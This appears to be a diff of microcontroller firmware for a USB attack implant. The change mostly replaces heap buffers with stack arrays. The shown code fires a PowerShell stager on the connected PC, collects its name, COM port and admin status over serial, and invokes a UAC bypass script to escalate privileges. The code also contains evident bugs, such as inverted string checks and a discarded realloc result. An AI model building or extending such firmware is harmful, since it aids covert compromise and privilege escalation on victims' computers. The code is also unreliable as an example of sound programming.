@@ -123,23 +123,21 @@ void setup() {
 	functions->fire(); //we use this again, so don't free it
 	Payload* stager = new Payload("stager.ps1");
 	stager->fire(); //fire stager
-	char* init = (char*)malloc(5);
+	char init[5];
 	readline(init, 5, &Serial);
 	if(strcmp(init,"init")){
 		Serial.println("ack");
 	} else {
 		panic(); //Didn't get init from stager!
 	}
-	free(init);
-	char* pcname = (char*)malloc(16);
+	char pcname[16];
 	readline(pcname, 16, &Serial);
-	char* comport = (char*)malloc(6);
+	char comport[6];
 	readline(comport, 6, &Serial);
 //	char* uacstatus = (char*)malloc();
 //	readline(uacstatus, , *Serial);  //TODO: parse return of this function and figure out how to bypass
-	char* adminstatus = (char*)malloc(6);
+	char adminstatus[6];
 	readline(adminstatus, 6, &Serial);
-	//TODO: add UAC bypass if user is admin but program is not
 	if (strcmp(adminstatus, "False")){
 //		prepsecondstage((char*)secondstage_ps1, secondstage_ps1_len, comport); //tell stager the COM port to use
 		UACBypass("psadmin.ps1");
@@ -163,11 +161,11 @@ void prepsecondstage(char* stage, int len, char* comport){
 
 void readconfig(){
 	File conf = SD.open("config.txt");
-	char* line = (char*)malloc(100);
+	char line[100];
 	bool run=true;
-	char* filename = (char*)malloc(50);
-	char* ext = (char*)malloc(3);
-	char* magic = (char*)malloc(50);
+	char filename[50];
+	char ext[3];
+	char magic[50];
 	while (run){
 		for(int i = 0; i<100; i++){
 			line[i]=conf.read();
@@ -234,7 +232,7 @@ void readconfig(){
 		Serial1.printf("Payload %d: %s\n",(payloadc+1),filename);
 		load->setmagic(magic);
 		load->setext(ext);
-		if (payloadc ==0){
+		if (payloadc ==0){ //yes eclipse, I know you don't know what size_t is
 			payloads = (Payload**)malloc(sizeof(Payload)); //Allocate stack
 		}else {
 			realloc(payloads, sizeof(payloads)+sizeof(Payload*)); //add a space onto payload stack
@@ -244,10 +242,6 @@ void readconfig(){
 
 	}
 	breakloop: //end of the loop
-	free(line);
-	free(filename);
-	free(magic);
-	free(ext);
 	conf.close();
 }
 
